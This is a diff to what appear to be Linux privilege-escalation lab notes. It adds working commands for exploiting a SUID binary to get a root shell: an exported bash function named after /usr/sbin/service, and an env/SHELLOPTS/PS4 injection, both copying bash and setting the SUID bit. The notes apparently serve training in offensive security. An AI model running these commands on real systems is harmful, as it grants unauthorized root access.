@@ -83,5 +83,9 @@ void inject() {
 
 - `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env2` this launches apache using its full path service (we know this by making a strings on the file).  
 ![image](https://user-images.githubusercontent.com/96747355/170265161-6ffb4183-13e3-418f-8317-5fb8ba1c1faf.png)  
-**COMING SOON**
+- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }` instead of creating a malicious bin we create a malicious function
+- `export -f /usr/sbin/service` then we export our function in the path
+- `/usr/local/bin/suid-env2` finally we just need to launch the service  
+**OR**  
+- `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`
 
